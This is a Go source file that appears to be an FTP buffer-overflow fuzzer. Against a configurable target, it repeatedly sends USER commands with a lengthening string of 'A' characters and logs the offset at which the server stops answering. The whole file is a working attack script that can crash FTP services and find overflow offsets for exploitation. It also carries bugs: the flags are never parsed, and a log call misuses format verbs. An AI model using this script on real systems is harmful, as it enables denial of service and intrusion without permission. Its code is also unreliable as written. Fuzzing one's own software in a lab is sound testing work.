package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"strconv"
)

func main() {

	var ip string
	var port int
	var buffer int

	flag.StringVar(&ip, "ip", "127.0.0.1", "Specify target. Default is 127.0.0.1")
	flag.IntVar(&port, "port", 21, "Specify port. Default is 21")
	flag.IntVar(&buffer, "buffer", 2500, "Specify buffer length. Default is 2500")

	//   s2 := strconv.Itoa(i)

	for i := 0; i < buffer; i++ {
		conn, err := net.Dial("tcp", ip+":"+strconv.Itoa(port))
		if err != nil {
			log.Fatalf("[!] Error at offset %d: %s\n", i, err)
		}
		bufio.NewReader(conn).ReadString('\n')

		user := ""
		for n := 0; n <= i; n++ {
			user += "A"
		}

		raw := "USER %s\n"
		fmt.Fprintf(conn, raw, user)
		bufio.NewReader(conn).ReadString('\n')
		raw = "PASS password\n"
		fmt.Fprintf(conn, raw)
		bufio.NewReader(conn).ReadString('\n')

		if err := conn.Close(); err != nil {
			log.Println("[!] Error at offset %d: %s\n", i, err)
		}
	}
}
